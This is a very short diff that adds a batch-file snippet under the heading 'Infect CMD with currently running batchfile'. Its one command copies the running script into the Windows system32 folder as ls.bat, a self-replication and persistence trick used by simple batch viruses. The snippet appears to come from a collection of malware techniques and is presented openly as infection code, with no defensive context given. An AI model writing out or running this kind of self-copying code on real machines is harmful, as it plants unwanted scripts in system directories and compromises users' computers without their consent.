@@ -1,0 +1,3 @@
+Infect CMD with currently running batchfile:
+
+copy %0 %windir%\system32\ls.bat
